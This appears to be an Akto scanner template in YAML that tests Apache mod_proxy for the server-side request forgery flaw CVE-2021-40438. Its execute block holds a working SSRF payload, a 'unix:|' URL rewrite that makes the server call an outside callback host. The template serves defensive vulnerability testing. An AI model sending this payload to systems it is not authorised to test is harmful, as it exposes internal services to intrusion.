id: APACHE_MOD_PROXY_SSRF
info:
  name: "Apache Mod_Proxy Server-Side Request Forgery"
  description: "This vulnerability allows an attacker to send crafted requests to internal or external services through a vulnerable proxy configuration. By exploiting this flaw, an attacker can manipulate the server to make unauthorized requests, potentially exposing sensitive data or triggering actions on behalf of the server. This vulnerability often arises from misconfigurations or inadequate input validation. It poses significant risks to the security of backend services and sensitive information."
  details:  "This vulnerability affects versions where user-controlled input is not properly validated before being used to make proxy requests. Attackers can leverage this flaw to send requests to arbitrary URLs, including internal services that are not meant to be exposed to external users. This can lead to unauthorized data access, information leakage, or even remote code execution, depending on the services accessible through the proxy. Properly securing proxy configurations and implementing strict input validation can help mitigate this risk."
  impact: "The impact of this vulnerability can be severe, as it allows attackers to access internal resources that are otherwise protected from external exposure. Successful exploitation can lead to sensitive information disclosure, manipulation of internal services, or even the execution of unauthorized commands on the server. Additionally, this vulnerability could be a stepping stone for further attacks within the network, potentially compromising other systems and data. Organizations should prioritize patching and securing their proxy configurations to prevent such risks."
  category:
    name: SSRF
    shortName: Server Side Request Forgery
    displayName: Server Side Request Forgery (SSRF)
  subCategory: APACHE_MOD_PROXY_SSRF
  severity: MEDIUM
  references:
    - "https://github.com/OWASP/API-Security/blob/master/editions/2023/en/0xa7-server-side-request-forgery.md"
    - "https://www.akto.io/blog/how-to-prevent-server-side-request-forgery-ssrf-as-a-developer"
    - "https://www.cobalt.io/blog/from-ssrf-to-port-scanner"
  cwe:
    - CWE-918
  cve:
    - CVE-2021-40438

api_selection_filters:
  method:
    neq: "OPTIONS"
  response_code:
    gte: 200
    lt: 300
  response_payload:
    length:
      gt: 0
  url:
    extract: urlVar
  request_headers:
    for_one:
      key:
        eq: "host"
      value:
        extract: hostHeaderVal
execute:
  type: single
  requests:
    - req:
      - send_ssrf_req:
          url: "https://test-services.akto.io/store_uuid/${random_uuid}"
      - modify_url: "/?unix:|https://test-services.akto.io/store_uuid/${random_uuid}/"
      - modify_method: GET
      - replace_body: '{}'
      - follow_redirect: true
validate:
  response_payload:
    length:
      gt: 0
  ssrf_url_hit: "${random_uuid}"

